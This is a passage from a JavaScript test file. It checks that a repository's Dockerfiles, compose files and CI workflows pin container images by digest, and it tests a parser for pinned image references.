    assert.match(failureText(gate), /base image is not digest-pinned at docker\/Dockerfile\.tools:1/);
  });
});

// ---------------------------------------------------------------------------
// The one non-digest an `image:` may be
// ---------------------------------------------------------------------------

/**
 * A compose interpolation, spelled through a substitution rather than written out.
 *
 * Biome has two rules that disagree about this text. `noTemplateCurlyInString`
 * refuses a plain string containing the interpolation syntax, because that is
 * nearly always a template literal somebody forgot to mark. `noUnusedTemplateLiteral`
 * refuses a template literal with no substitution in it, because that should be a
 * plain string. Both are right in general, and together they leave no spelling for
 * a string that must genuinely contain compose's syntax. Building the opening
 * through one substitution satisfies both. The repository has no `biome-ignore`
 * comments anywhere and a lint workaround would be a poor place to add the first.
 */
const interpolation = (body) => `\u0024{${body}}`;

describe('digest-bearing compose interpolation', () => {
  const compose = (value) => `services:\n  api:\n    image: ${value}\n`;

  it('accepts a REQUIRED interpolation with no default', () => {
    const gate = new Gate('t');
    const judged = checkComposePinning(
      gate,
      'docker-compose.staging.yml',
      compose(interpolation('PRL_API_IMAGE:?the API image DIGEST. Run `pnpm run release:artifacts` first')),
    );
    assert.equal(judged, 1, 'the line must still be judged, not skipped');
    assert.deepEqual(gate.failures, [], failureText(gate));
  });

  it('REFUSES an interpolation with a tag as its default — the shape people reach for', () => {
    const gate = new Gate('t');
    checkComposePinning(gate, 'compose.yml', compose(interpolation('PRL_API_IMAGE:-prl-api:latest')));
    assert.match(failureText(gate), /compose image is not digest-pinned/);
  });

  it('REFUSES a bare interpolation with no default and no requirement', () => {
    const gate = new Gate('t');
    checkComposePinning(gate, 'compose.yml', compose(interpolation('PRL_API_IMAGE')));
    assert.equal(
      gate.failures.length,
      1,
      `${interpolation('VAR')} constrains nothing and compose substitutes empty`,
    );
  });

  it('reads the WHOLE value, not the first word', () => {
    // The required message contains spaces, so a `\S+` capture judged only the
    // fragment up to the first space — which happens to look unpinned — so this
    // asserts the parse rather than the verdict.
    const gate = new Gate('t');
    checkComposePinning(gate, 'compose.yml', compose('postgres:16 with trailing words'));
    assert.match(failureText(gate), /postgres:16 with trailing words/);
  });

  it('does NOT extend the exception to a workflow service container', () => {
    // GitHub Actions does not interpolate `${...}` the way compose does, so the
    // same text there is a literal image name that resolves to nothing.
    const gate = new Gate('t');
    checkWorkflowPinning(
      gate,
      'ci.yml',
      `jobs:\n  a:\n    services:\n      db:\n        image: ${interpolation('PRL_DB_IMAGE:?why')}\n`,
    );
    assert.match(failureText(gate), /service container is not digest-pinned/);
  });
});

// ---------------------------------------------------------------------------
// The freshness reporter's parser
// ---------------------------------------------------------------------------

describe('pinned-reference parsing', () => {
  const digest = `sha256:${'a'.repeat(64)}`;

  it('splits name, tag and digest', () => {
    assert.deepEqual(parsePinnedReference(`postgres:16-bookworm@${digest}`), {
      name: 'postgres',
      tag: '16-bookworm',
      digest,
    });
  });

  it('handles an org-scoped name', () => {
    assert.deepEqual(parsePinnedReference(`nginxinc/nginx-unprivileged:1.29.8-alpine@${digest}`), {
      name: 'nginxinc/nginx-unprivileged',
      tag: '1.29.8-alpine',
      digest,
    });
  });

  it('does not mistake a registry PORT for a tag', () => {
    // `localhost:5000/x@sha256:...` has a colon that introduces a port, not a tag.
    // Reading it as a tag would send the freshness reporter after `5000/x`.
    assert.deepEqual(parsePinnedReference(`localhost:5000/prl-api@${digest}`), {
      name: 'localhost:5000/prl-api',
      tag: null,
      digest,
    });
  });

  it('returns null for anything that is not digest-pinned', () => {
    for (const reference of [
      'postgres:16',
      interpolation('PRL_API_IMAGE:?why'),
      'postgres@sha256:short',
      '',
    ]) {
      assert.equal(parsePinnedReference(reference), null, `${reference} was parsed as a pinned reference`);
    }
  });

  it('collects every pinned reference in the real repository, with where it was found', () => {
    const pinned = collectPinnedImages(REPO_ROOT);
    // Three distinct base images today (node, postgres, nginx-unprivileged), each
    // pinned in more than one place. A floor rather than an equality: adding an
    // image must not fail this, but collecting nothing must.
    assert.ok(pinned.length >= 3, `only ${pinned.length} pinned reference(s) were collected`);
    assert.ok(
      pinned.every((entry) => Array.isArray(entry.at) && entry.at.length > 0),
      'every reference must record at least one file:line',
    );
    const postgres = pinned.find((entry) => entry.name === 'postgres');
    assert.ok(postgres !== undefined, 'the postgres pin was not collected');
    assert.ok(
      postgres.at.some((where) => where.startsWith('docker-compose.staging.yml:')),
      `the staging compose file was not among ${postgres.at.join(', ')}`,
    );
  });
});
